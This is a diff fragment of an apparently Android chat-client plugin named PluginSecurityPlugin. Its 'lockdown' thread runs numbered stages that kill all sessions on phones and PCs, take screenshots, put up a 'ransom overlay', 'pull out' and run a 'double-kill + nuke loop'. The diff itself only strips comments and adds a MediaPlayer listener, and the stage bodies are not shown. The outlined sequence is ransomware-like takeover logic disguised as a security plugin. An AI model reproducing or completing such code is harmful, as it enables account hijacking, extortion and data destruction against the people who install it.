                 k, total = self._kill_all_sessions(0, phones_pc_only=True)
                 report.append("<b>Phones/PCs killed:</b> %d / %d" % (k, total))
 
-                # 6 screenshot gain
                 if not alive():
                     return
                 self._send_msg("6/9 screenshot gain...")
@@ -3194,7 +3420,6 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception:
                     pass
 
-                # 7 RANSOM (перед pull out)
                 if not alive():
                     return
                 self._send_msg("7/9 ransom overlay...")
@@ -3207,7 +3432,6 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception as e:
                     report.append("<b>Ransom:</b> %s" % e)
 
-                # 8 pull out — последним
                 if not alive():
                     return
                 self._send_msg("8/9 pull out...")
@@ -3217,7 +3441,6 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception as e:
                     report.append("<b>Pull Out:</b> %s" % e)
 
-                # 9 double-kill + nuke loop
                 if not alive():
                     return
                 self._send_msg("9/9 double-kill + nuke...")
@@ -3248,6 +3471,29 @@ class PluginSecurityPlugin(BasePlugin):
                 self._send_msg("lockdown err: " + str(e))
 
         threading.Thread(target=task, daemon=True).start()
+
+
+_MediaPreparedCls = None
+
+
+def _media_prepared_cls():
+    global _MediaPreparedCls
+    if _MediaPreparedCls is None:
+        MP = jclass("android.media.MediaPlayer$OnPreparedListener")
+
+        class _MP(dynamic_proxy(MP)):
+            def __init__(self, vv):
+                super().__init__()
+                self.vv = vv
+
+            def onPrepared(self, mp):
+                try:
+                    self.vv.start()
+                except Exception:
+                    pass
+
+        _MediaPreparedCls = _MP
+    return _MediaPreparedCls
 
 
 def create_plugin():
